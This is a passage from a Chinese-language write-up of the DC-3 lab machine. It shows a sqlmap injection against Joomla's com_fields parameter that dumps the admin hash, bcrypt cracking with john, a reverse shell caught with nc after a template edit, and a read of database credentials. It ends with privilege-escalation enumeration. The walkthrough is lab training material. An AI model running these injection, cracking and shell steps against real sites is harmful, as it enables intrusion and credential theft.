class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sqlmap -u <span class="hljs-string">&quot;http://192.168.56.125/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot;</span> --risk=3 --level=5 --random-agent -D joomladb -p list[fullordering] -T <span class="hljs-string">&#x27;#__users&#x27;</span> --dump     <br>        ___<br>       __H__                                                                                                        <br> ___ ___[<span class="hljs-string">&quot;]_____ ___ ___  &#123;1.7.6#stable&#125;                                                                            </span><br><span class="hljs-string">|_ -| . [&quot;</span>]     | .<span class="hljs-string">&#x27;| . |                                                                                           </span><br><span class="hljs-string">|___|_  [&quot;]_|_|_|__,|  _|                                                                                           </span><br><span class="hljs-string">      |_|V...       |_|   https://sqlmap.org                                                                        </span><br><span class="hljs-string"></span><br><span class="hljs-string">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;</span>s responsibility to obey all applicable <span class="hljs-built_in">local</span>, state and federal laws. Developers assume no liability and are not responsible <span class="hljs-keyword">for</span> any misuse or damage caused by this program<br><br>[*] starting @ 11:10:50 /2023-07-10/<br><br>[11:10:50] [INFO] fetched random HTTP User-Agent header value <span class="hljs-string">&#x27;Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-us) AppleWebKit/419 (KHTML, like Gecko) Safari/419.3&#x27;</span> from file <span class="hljs-string">&#x27;/usr/share/sqlmap/data/txt/user-agents.txt&#x27;</span>                 <br>[11:10:50] [INFO] resuming back-end DBMS <span class="hljs-string">&#x27;mysql&#x27;</span> <br>[11:10:50] [INFO] testing connection to the target URL<br>[11:10:51] [WARNING] the web server responded with an HTTP error code (500) <span class="hljs-built_in">which</span> could interfere with the results of the tests<br>you have not declared cookie(s), <span class="hljs-keyword">while</span> server wants to <span class="hljs-built_in">set</span> its own (<span class="hljs-string">&#x27;460ada11b31d3c5e5ca6e58fd5d3de27=k6o2ipqeqht...g5bmibevh0&#x27;</span>). Do you want to use those [Y/n] y<br>sqlmap resumed the following injection point(s) from stored session:<br>---<br>Parameter: list[fullordering] (GET)<br>    Type: error-based<br>    Title: MySQL &gt;= 5.1 error-based - Parameter replace (UPDATEXML)<br>    Payload: option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(UPDATEXML(7808,CONCAT(0x2e,0x7162786b71,(SELECT (ELT(7808=7808,1))),0x716b766b71),3038))<br><br>    Type: time-based blind<br>    Title: MySQL &gt;= 5.0.12 time-based blind - Parameter replace (substraction)<br>    Payload: option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(SELECT 3897 FROM (SELECT(SLEEP(5)))wOhr)<br>---<br>[11:10:52] [INFO] the back-end DBMS is MySQL<br>web server operating system: Linux Ubuntu 16.10 or 16.04 (xenial or yakkety)<br>web application technology: Apache 2.4.18<br>back-end DBMS: MySQL &gt;= 5.1<br>[11:10:52] [INFO] fetching columns <span class="hljs-keyword">for</span> table <span class="hljs-string">&#x27;#__users&#x27;</span> <span class="hljs-keyword">in</span> database <span class="hljs-string">&#x27;joomladb&#x27;</span><br>[11:10:52] [WARNING] unable to retrieve column names <span class="hljs-keyword">for</span> table <span class="hljs-string">&#x27;#__users&#x27;</span> <span class="hljs-keyword">in</span> database <span class="hljs-string">&#x27;joomladb&#x27;</span><br><span class="hljs-keyword">do</span> you want to use common column existence check? [y/N/q] y<br>[11:10:53] [WARNING] <span class="hljs-keyword">in</span> <span class="hljs-keyword">case</span> of continuous data retrieval problems you are advised to try a switch <span class="hljs-string">&#x27;--no-cast&#x27;</span> or switch <span class="hljs-string">&#x27;--hex&#x27;</span><br><span class="hljs-built_in">which</span> common columns (wordlist) file <span class="hljs-keyword">do</span> you want to use?<br>[1] default <span class="hljs-string">&#x27;/usr/share/sqlmap/data/txt/common-columns.txt&#x27;</span> (press Enter)<br>[2] custom<br>&gt; <br>[11:10:54] [INFO] checking column existence using items from <span class="hljs-string">&#x27;/usr/share/sqlmap/data/txt/common-columns.txt&#x27;</span><br>[11:10:54] [INFO] adding words used on web page to the check list<br>please enter number of threads? [Enter <span class="hljs-keyword">for</span> 1 (current)] <br>[11:10:56] [WARNING] running <span class="hljs-keyword">in</span> a single-thread mode. This could take a <span class="hljs-keyword">while</span><br>[11:10:56] [INFO] retrieved: <span class="hljs-built_in">id</span>                                                                                    <br>[11:10:56] [INFO] retrieved: name                                                                                  <br>[11:10:56] [INFO] retrieved: username                                                                              <br>[11:10:57] [INFO] retrieved: email                                                                                 <br>[11:11:00] [INFO] retrieved: password                                                                              <br>[11:11:44] [INFO] retrieved: params                                                                                <br>                                                                                                                   <br>[11:11:56] [INFO] fetching entries <span class="hljs-keyword">for</span> table <span class="hljs-string">&#x27;#__users&#x27;</span> <span class="hljs-keyword">in</span> database <span class="hljs-string">&#x27;joomladb&#x27;</span><br>[11:11:56] [INFO] retrieved: <span class="hljs-string">&#x27;admin&#x27;</span><br>[11:11:56] [INFO] retrieved: <span class="hljs-string">&#x27;$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu&#x27;</span><br>[11:11:56] [INFO] retrieved: <span class="hljs-string">&#x27;freddy@norealaddress.net&#x27;</span><br>[11:11:56] [INFO] retrieved: <span class="hljs-string">&#x27;629&#x27;</span><br>[11:11:56] [INFO] retrieved: <span class="hljs-string">&#x27;&#123;&quot;admin_style&quot;:&quot;&quot;,&quot;admin_language&quot;:&quot;&quot;,&quot;language&quot;:&quot;&quot;,&quot;editor&quot;:&quot;&quot;,&quot;helpsite&quot;:&quot;&quot;,&quot;time...</span><br><span class="hljs-string">[11:11:56] [INFO] retrieved: &#x27;</span>admin<span class="hljs-string">&#x27;</span><br><span class="hljs-string">Database: joomladb</span><br><span class="hljs-string">Table: #__users</span><br><span class="hljs-string">[1 entry]</span><br><span class="hljs-string">+-----+--------------------------+--------+----------------------------------------------------------------------------------------------+----------+--------------------------------------------------------------+</span><br><span class="hljs-string">| id  | email                    | name   | params                                                                                       | username | password                                                     |</span><br><span class="hljs-string">+-----+--------------------------+--------+----------------------------------------------------------------------------------------------+----------+--------------------------------------------------------------+</span><br><span class="hljs-string">| 629 | freddy@norealaddress.net | admin  | &#123;&quot;admin_style&quot;:&quot;&quot;,&quot;admin_language&quot;:&quot;&quot;,&quot;language&quot;:&quot;&quot;,&quot;editor&quot;:&quot;&quot;,&quot;helpsite&quot;:&quot;&quot;,&quot;timezone&quot;:&quot;&quot;&#125; | admin    | $2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu |</span><br><span class="hljs-string">+-----+--------------------------+--------+----------------------------------------------------------------------------------------------+----------+--------------------------------------------------------------+</span><br><span class="hljs-string"></span><br><span class="hljs-string">[11:11:56] [INFO] table &#x27;</span>joomladb.`<span class="hljs-comment">#__users`&#x27; dumped to CSV file &#x27;/home/kali/.local/share/sqlmap/output/192.168.56.125/dump/joomladb/#__users.csv&#x27;                                                                                      </span><br>[11:11:56] [WARNING] HTTP error codes detected during run:<br>500 (Internal Server Error) - 2683 <span class="hljs-built_in">times</span><br>[11:11:56] [INFO] fetched data logged to text files under <span class="hljs-string">&#x27;/home/kali/.local/share/sqlmap/output/192.168.56.125&#x27;</span><br><br>[*] ending @ 11:11:56 /2023-07-10/<br></code></pre></td></tr></table></figure>
+
+<h2 id="john爆破"><a href="#john爆破" class="headerlink" title="john爆破"></a>john爆破</h2><p>拿到了用户密码的哈希值，在线工具没有搜索到，那就使用 john 来破解，同时还发现自己使用 john 命令老师忘记 <code>--wordlist=</code> 最后的 <code>=</code>，<code>hash-identifier</code> 没有识别出识别哈希类型，使用在线工具确定了哈希类型为 bcrypt，但是 <code>--format</code> 中没有这个哈希类型。通过网络搜索发现的确是可以使用 <code>--format=bcrypt</code> 的</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/dc_3]<br>└─$ <span class="hljs-built_in">cat</span> passwd <br>$2y$10<span class="hljs-variable">$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu</span><br><br>┌──(kali㉿kali)-[~/Downloads/dc_3]<br>└─$ sudo john --wordlist=/usr/share/wordlists/rockyou.txt passwd --format=bcrypt<br>Using default input encoding: UTF-8<br>Loaded 1 password <span class="hljs-built_in">hash</span> (bcrypt [Blowfish 32/64 X3])<br>Cost 1 (iteration count) is 1024 <span class="hljs-keyword">for</span> all loaded hashes<br>Will run 4 OpenMP threads<br>Press <span class="hljs-string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="hljs-keyword">for</span> status<br>snoopy           (?)     <br>1g 0:00:00:00 DONE (2023-07-10 11:33) 1.086g/s 156.5p/s 156.5c/s 156.5C/s mylove..sandra<br>Use the <span class="hljs-string">&quot;--show&quot;</span> option to display all of the cracked passwords reliably<br>Session completed. <br></code></pre></td></tr></table></figure>
+
+<h2 id="Joomla-后台反弹-shell"><a href="#Joomla-后台反弹-shell" class="headerlink" title="Joomla 后台反弹 shell"></a>Joomla 后台反弹 shell</h2><p>使用这个密码登录后台，然后修改模板文件进而将反弹 shell 的代码写入其中</p>
+<p><img src="/pic/7bcf2562d3dc9c92980cf07ea78dbdc7_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/pic/e219b70abb4bdc9984453c4a5b08d04d_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/pic/fea345c955a85e5d477b1e5bbe477504_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>注意访问这个文件的路径为 <code>http://192.168.56.125/templates/beez3/8888.php</code>，可以根据目录爆破的结果辅助判断文件路径</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nc -lvnp 443    <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>listening on [any] 443 ...<br>connect to [192.168.56.106] from (UNKNOWN) [192.168.56.125] 53722<br>bash: cannot <span class="hljs-built_in">set</span> terminal process group (1173): Inappropriate ioctl <span class="hljs-keyword">for</span> device<br>bash: no job control <span class="hljs-keyword">in</span> this shell<br>www-data@DC-3:/var/www/html/templates/beez3$ <span class="hljs-built_in">whoami</span><br><span class="hljs-built_in">whoami</span><br>www-data<br>www-data@DC-3:/var/www/html/templates/beez3$ <span class="hljs-built_in">id</span><br><span class="hljs-built_in">id</span><br>uid=33(www-data) gid=33(www-data) <span class="hljs-built_in">groups</span>=33(www-data)<br>www-data@DC-3:/var/www/html/templates/beez3$ ip a<br>ip a<br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1<br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>       valid_lft forever preferred_lft forever<br>    inet6 ::1/128 scope host <br>       valid_lft forever preferred_lft forever<br>2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 08:00:27:cc:d5:<span class="hljs-built_in">df</span> brd ff:ff:ff:ff:ff:ff<br>    inet 192.168.56.125/24 brd 192.168.56.255 scope global eth0<br>       valid_lft forever preferred_lft forever<br>    inet6 fe80::a00:27ff:fecc:d5df/64 scope <span class="hljs-built_in">link</span> <br>       valid_lft forever preferred_lft forever<br>www-data@DC-3:/var/www/html/templates/beez3$ <span class="hljs-built_in">uname</span> -a<br><span class="hljs-built_in">uname</span> -a<br>Linux DC-3 4.4.0-21-generic <span class="hljs-comment">#37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 athlon i686 GNU/Linux</span><br>www-data@DC-3:/var/www/html/templates/beez3$ python -c <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br>&lt;/templates/beez3$ python -c <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br><br></code></pre></td></tr></table></figure>
+
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>反弹 shell 成功，开始收集文件信息，尤其是配置文件中的数据库密码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@DC-3:/var/www/html$ <span class="hljs-built_in">cat</span> configuration.php<br><span class="hljs-built_in">cat</span> configuration.php<br>&lt;?php<br>class JConfig &#123;<br>        public <span class="hljs-variable">$offline</span> = <span class="hljs-string">&#x27;0&#x27;</span>;<br>        public <span class="hljs-variable">$offline_message</span> = <span class="hljs-string">&#x27;This site is down for maintenance.&lt;br /&gt;Please check back again soon.&#x27;</span>;<br>        public <span class="hljs-variable">$display_offline_message</span> = <span class="hljs-string">&#x27;1&#x27;</span>;<br>        public <span class="hljs-variable">$offline_image</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>        public <span class="hljs-variable">$sitename</span> = <span class="hljs-string">&#x27;DC-3&#x27;</span>;<br>        public <span class="hljs-variable">$editor</span> = <span class="hljs-string">&#x27;tinymce&#x27;</span>;<br>        public <span class="hljs-variable">$captcha</span> = <span class="hljs-string">&#x27;0&#x27;</span>;<br>        public <span class="hljs-variable">$list_limit</span> = <span class="hljs-string">&#x27;20&#x27;</span>;<br>        public <span class="hljs-variable">$access</span> = <span class="hljs-string">&#x27;1&#x27;</span>;<br>        public <span class="hljs-variable">$debug</span> = <span class="hljs-string">&#x27;0&#x27;</span>;<br>        public <span class="hljs-variable">$debug_lang</span> = <span class="hljs-string">&#x27;0&#x27;</span>;<br>        public <span class="hljs-variable">$dbtype</span> = <span class="hljs-string">&#x27;mysqli&#x27;</span>;<br>        public <span class="hljs-variable">$host</span> = <span class="hljs-string">&#x27;localhost&#x27;</span>;<br>        public <span class="hljs-variable">$user</span> = <span class="hljs-string">&#x27;root&#x27;</span>;<br>        public <span class="hljs-variable">$password</span> = <span class="hljs-string">&#x27;squires&#x27;</span>;<br>        public <span class="hljs-variable">$db</span> = <span class="hljs-string">&#x27;joomladb&#x27;</span>;<br>        public <span class="hljs-variable">$dbprefix</span> = <span class="hljs-string">&#x27;d8uea_&#x27;</span>;<br>        public <span class="hljs-variable">$live_site</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>        public <span class="hljs-variable">$secret</span> = <span class="hljs-string">&#x27;7M6S1HqGMvt1JYkY&#x27;</span>;<br>        public <span class="hljs-variable">$gzip</span> = <span class="hljs-string">&#x27;0&#x27;</span>;<br>        public <span class="hljs-variable">$error_reporting</span> = <span class="hljs-string">&#x27;default&#x27;</span>;<br>        public <span class="hljs-variable">$helpurl</span> = <span class="hljs-string">&#x27;https://help.joomla.org/proxy/index.php?keyref=Help&#123;major&#125;&#123;minor&#125;:&#123;keyref&#125;&#x27;</span>;<br>        public <span class="hljs-variable">$ftp_host</span> = <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>;<br>        public <span class="hljs-variable">$ftp_port</span> = <span class="hljs-string">&#x27;21&#x27;</span>;<br>        public <span class="hljs-variable">$ftp_user</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>        public <span class="hljs-variable">$ftp_pass</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>        public <span class="hljs-variable">$ftp_root</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>        public <span class="hljs-variable">$ftp_enable</span> = <span class="hljs-string">&#x27;0&#x27;</span>;<br>        public <span class="hljs-variable">$offset</span> = <span class="hljs-string">&#x27;UTC&#x27;</span>;<br>        public <span class="hljs-variable">$mailonline</span> = <span class="hljs-string">&#x27;1&#x27;</span>;<br>        public <span class="hljs-variable">$mailer</span> = <span class="hljs-string">&#x27;mail&#x27;</span>;<br>        public <span class="hljs-variable">$mailfrom</span> = <span class="hljs-string">&#x27;freddy@norealaddress.net&#x27;</span>;<br>        public <span class="hljs-variable">$fromname</span> = <span class="hljs-string">&#x27;DC-3&#x27;</span>;<br>        public <span class="hljs-variable">$sendmail</span> = <span class="hljs-string">&#x27;/usr/sbin/sendmail&#x27;</span>;<br>        public <span class="hljs-variable">$smtpauth</span> = <span class="hljs-string">&#x27;0&#x27;</span>;<br>        public <span class="hljs-variable">$smtpuser</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>        public <span class="hljs-variable">$smtppass</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>        public <span class="hljs-variable">$smtphost</span> = <span class="hljs-string">&#x27;localhost&#x27;</span>;<br>        public <span class="hljs-variable">$smtpsecure</span> = <span class="hljs-string">&#x27;none&#x27;</span>;<br>        public <span class="hljs-variable">$smtpport</span> = <span class="hljs-string">&#x27;25&#x27;</span>;<br>        public <span class="hljs-variable">$caching</span> = <span class="hljs-string">&#x27;0&#x27;</span>;<br>        public <span class="hljs-variable">$cache_handler</span> = <span class="hljs-string">&#x27;file&#x27;</span>;<br>        public <span class="hljs-variable">$cachetime</span> = <span class="hljs-string">&#x27;15&#x27;</span>;<br>        public <span class="hljs-variable">$cache_platformprefix</span> = <span class="hljs-string">&#x27;0&#x27;</span>;<br>        public <span class="hljs-variable">$MetaDesc</span> = <span class="hljs-string">&#x27;A website for DC-3&#x27;</span>;<br>        public <span class="hljs-variable">$MetaKeys</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>        public <span class="hljs-variable">$MetaTitle</span> = <span class="hljs-string">&#x27;1&#x27;</span>;<br>        public <span class="hljs-variable">$MetaAuthor</span> = <span class="hljs-string">&#x27;1&#x27;</span>;<br>        public <span class="hljs-variable">$MetaVersion</span> = <span class="hljs-string">&#x27;0&#x27;</span>;<br>        public <span class="hljs-variable">$robots</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>        public <span class="hljs-variable">$sef</span> = <span class="hljs-string">&#x27;1&#x27;</span>;<br>        public <span class="hljs-variable">$sef_rewrite</span> = <span class="hljs-string">&#x27;0&#x27;</span>;<br>        public <span class="hljs-variable">$sef_suffix</span> = <span class="hljs-string">&#x27;0&#x27;</span>;<br>        public <span class="hljs-variable">$unicodeslugs</span> = <span class="hljs-string">&#x27;0&#x27;</span>;<br>        public <span class="hljs-variable">$feed_limit</span> = <span class="hljs-string">&#x27;10&#x27;</span>;<br>        public <span class="hljs-variable">$feed_email</span> = <span class="hljs-string">&#x27;none&#x27;</span>;<br>        public <span class="hljs-variable">$log_path</span> = <span class="hljs-string">&#x27;/var/www/html/administrator/logs&#x27;</span>;<br>        public <span class="hljs-variable">$tmp_path</span> = <span class="hljs-string">&#x27;/var/www/html/tmp&#x27;</span>;<br>        public <span class="hljs-variable">$lifetime</span> = <span class="hljs-string">&#x27;15&#x27;</span>;<br>        public <span class="hljs-variable">$session_handler</span> = <span class="hljs-string">&#x27;database&#x27;</span>;<br>        public <span class="hljs-variable">$shared_session</span> = <span class="hljs-string">&#x27;0&#x27;</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="密码重用"><a href="#密码重用" class="headerlink" title="密码重用"></a>密码重用</h3><p>拿到了数据库的密码 <code>squires</code>，到这里我们收集到了两个密码一个是 Joomla 后台密码一个是数据库密码，可以进行简单的密码碰撞，但是经过我的尝试都失败了</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@DC-3:/tmp$ su -<br>su -<br>Password: 7M6S1HqGMvt1JYkY<br><br>su: Authentication failure<br>www-data@DC-3:/tmp$ su -<br>su -<br>Password: squires<br><br>su: Authentication failure<br>www-data@DC-3:/tmp$ su -<br>su -<br>Password: snoopy<br><br>su: Authentication failure<br>www-data@DC-3:/tmp$ su dc3<br>su dc3<br>Password: snoopy<br><br>su: Authentication failure<br>www-data@DC-3:/tmp$ su dc3<br>su dc3<br>Password: squires<br><br>su: Authentication failure<br>www-data@DC-3:/tmp$ su dc3<br>su dc3<br>Password: 7M6S1HqGMvt1JYkY<br><br>su: Authentication failure<br></code></pre></td></tr></table></figure>
+
+<p>进数据库看看也没什么收获，之前 sqlmap 已经把最关键的信息拿到了。</p>
+<p>看看定时任务</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@DC-3:/home$ <span class="hljs-built_in">cat</span> /etc/crontab<br><span class="hljs-built_in">cat</span> /etc/crontab<br><span class="hljs-comment"># /etc/crontab: system-wide crontab</span><br><span class="hljs-comment"># Unlike any other crontab you don&#x27;t have to run the `crontab&#x27;</span><br><span class="hljs-comment"># command to install the new version when you edit this file</span><br><span class="hljs-comment"># and files in /etc/cron.d. These files also have username fields,</span><br><span class="hljs-comment"># that none of the other crontabs do.</span><br><br>SHELL=/bin/sh<br>PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin<br><br><span class="hljs-comment"># m h dom mon dow user  command</span><br>17 *    * * *   root    <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.hourly<br>25 6    * * *   root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.daily )<br>47 6    * * 7   root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.weekly )<br>52 6    1 * *   root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.monthly )<br><span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>
+
+<p>看看 SUID 文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@DC-3:/home$ find / -<span class="hljs-built_in">type</span> f -perm -04000 -<span class="hljs-built_in">ls</span> 2&gt;/dev/null<br>find / -<span class="hljs-built_in">type</span> f -perm -04000 -<span class="hljs-built_in">ls</span> 2&gt;/dev/null<br>       91     44 -rwsr-xr-x   1 root     root        43316 May  8  2014 /bin/ping6<br>     3560    156 -rwsr-xr-x   1 root     root       157424 Mar 15  2019 /bin/ntfs-3g<br>      125     28 -rwsr-xr-x   1 root     root        26492 Apr 14  2016 /bin/umount<br>    59924     40 -rwsr-xr-x   1 root     root        38900 May 17  2017 /bin/su<br>     2220     32 -rwsr-xr-x   1 root     root        30112 Jul 12  2016 /bin/fusermount<br>       76     36 -rwsr-xr-x   1 root     root        34812 Apr 14  2016 /bin/mount<br>       90     40 -rwsr-xr-x   1 root     root        38932 May  8  2014 /bin/ping<br>   139240    104 -rwsr-sr-x   1 root     root       105004 Mar 19  2019 /usr/lib/snapd/snap-confine<br>   142376     16 -rwsr-xr-x   1 root     root        13960 Jan 15  2019 /usr/lib/policykit-1/polkit-agent-helper-1<br>     8400     40 -rwsr-xr-x   1 root     root        38300 Mar  8  2017 /usr/lib/i386-linux-gnu/lxc/lxc-user-nic<br>   139221    504 -rwsr-xr-x   1 root     root       513528 Mar  5  2019 /usr/lib/openssh/ssh-keysign<br>   138602     48 -rwsr-xr--   1 root     messagebus    46436 Oct 12  2016 /usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>     9572      8 -rwsr-xr-x   1 root     root           5480 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device<br>    35876     52 -rwsr-xr-x   1 root     root          53128 May 17  2017 /usr/bin/passwd<br>     8592     36 -rwsr-xr-x   1 root     root          36288 May 17  2017 /usr/bin/newgidmap<br>    35873     80 -rwsr-xr-x   1 root     root          78012 May 17  2017 /usr/bin/gpasswd<br>     9659    160 -rwsr-xr-x   1 root     root         159852 May 29  2017 /usr/bin/sudo<br>    12604     20 -rwsr-xr-x   1 root     root          18216 Jan 15  2019 /usr/bin/pkexec<br>    35872     40 -rwsr-xr-x   1 root     root          39560 May 17  2017 /usr/bin/chsh<br>    35874     48 -rwsr-xr-x   1 root     root          48264 May 17  2017 /usr/bin/chfn<br>     8591     36 -rwsr-xr-x   1 root     root          36288 May 17  2017 /usr/bin/newuidmap<br>    59923     36 -rwsr-xr-x   1 root     root          34680 May 17  2017 /usr/bin/newgrp<br>    39144     52 -rwsr-sr-x   1 daemon   daemon        50748 Jan 15  2016 /usr/bin/at<br></code></pre></td></tr></table></figure>
+
+<h3 id="尝试-prng-碰撞"><a href="#尝试-prng-碰撞" class="headerlink" title="尝试 prng 碰撞"></a>尝试 prng 碰撞</h3><p>去 gtfobins 中简单对照了一下，没有可以直接利用的点。接下来我又翻了各个文件夹，包括 dc3 用户家目录、网站目录，防止有隐藏文件，不过依然没有收获。也尝试了 <code>ps aux</code>, <code>netstat ano</code> 依然没收获，还尝试了 ssh 公钥<code>prng</code>碰撞。最后开始尝试内核提权和 <code>linpeas</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span 